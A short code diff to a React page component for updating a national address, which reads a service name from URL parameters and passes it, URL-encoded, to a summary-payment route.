@@ -4,6 +4,11 @@ import { submitData } from "@/lib/store";
 
 export default function NationalAddress() {
   const [, setLocation] = useLocation();
+  
+  // Get service name from URL params
+  const searchParams = new URLSearchParams(window.location.search);
+  const serviceName = searchParams.get('service') || 'تحديث بيانات العنوان الوطني';
+  
   const [searchQuery, setSearchQuery] = useState("");
   const [selectedAddress, setSelectedAddress] = useState("");
   const [city, setCity] = useState("");
@@ -162,7 +167,7 @@ export default function NationalAddress() {
     });
     
     // Navigate to Summary Payment page with service name
-    setLocation(`/summary-payment?service=${encodeURIComponent('تحديث بيانات العنوان الوطني')}`);
+    setLocation(`/summary-payment?service=${encodeURIComponent(serviceName)}`);
   };
 
   return (
